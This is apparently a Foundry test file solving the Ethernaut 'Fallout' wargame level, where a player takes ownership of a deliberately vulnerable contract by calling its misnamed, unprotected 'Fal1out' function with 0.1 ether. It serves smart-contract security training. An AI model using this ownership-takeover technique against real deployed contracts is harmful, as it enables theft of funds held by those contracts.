// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Fallout/FalloutFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

// forge test --match-contract FalloutTest -vvvv
contract FalloutTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether);
    }

    function testFalloutHack() public {
        /****************
         * Factory setup *
         *************** */
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        /****************
         *    Attack     *
         *************** */
        // Here the function to change ownership is not protected
        // A simple call with a bit of ETH is enough to gain ownership
        ethernautFallout.Fal1out{value: 0.1 ether}();
        // emit log_named_address("new owner", ethernautFallout.owner());

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
